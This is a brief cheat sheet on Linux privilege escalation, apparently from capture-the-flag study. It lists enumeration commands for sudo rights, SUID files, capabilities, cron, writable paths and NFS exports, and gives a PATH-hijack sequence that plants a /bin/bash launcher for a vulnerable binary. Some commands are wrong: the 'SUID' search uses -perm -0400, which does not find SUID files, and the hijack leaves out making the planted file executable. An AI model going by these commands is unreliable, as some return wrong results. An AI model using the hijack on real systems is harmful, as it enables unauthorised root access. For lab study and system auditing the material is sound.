# Linux Privilege Escalation

#### Kernel Exploit

* **Search for Exploits:**
  * Research and find kernel exploits suitable for the target system.
  * Execute the exploit to escalate privileges.

#### Sudo Rights

* **Check Sudo Rights:**
  * Use `sudo -l` to display programs with sudo rights.

#### SUID (Set User ID)

* **Find SUID Files:**
  *   Use the following command to list files with SUID or SGID bits set:

      ```bash
      find / -type f -perm -0400 -ls 2>/dev/null
      ```

#### CAPA (Capabilities)

* **List Applications with Capabilities:**
  *   Use the following command to list all applications with capabilities set:

      ```bash
      getcap -r / 2>/dev/null
      ```

#### Cron Jobs

* **View Cron Jobs:**
  *   Display the cron jobs configured on the system:

      ```bash
      cat /etc/crontab
      ```

#### PATH

* **Show System's PATH:**
  *   Display the system's PATH variable:

      ```bash
      echo $PATH
      ```
* **Writable Directories:**
  *   Identify writable directories:

      ```bash
      find / -writable 2>/dev/null
      ```
* **PATH Manipulation:**
  *   Temporarily modify PATH for privilege escalation:

      ```bash
      export PATH=/tmp:$PATH
      cd /tmp
      echo "/bin/bash" > thm
      cd /home/murdoch
      ./test
      ```

#### NFS (Network File System)

* **Show Shared Folders:**
  *   Use `showmount` to display shared folders on an NFS server:

      ```bash
      showmount -e <ip>
      ```
* **NFS Configuration:**
  *   View the configuration of shared folders:

      ```bash
      cat /etc/exports
      ```
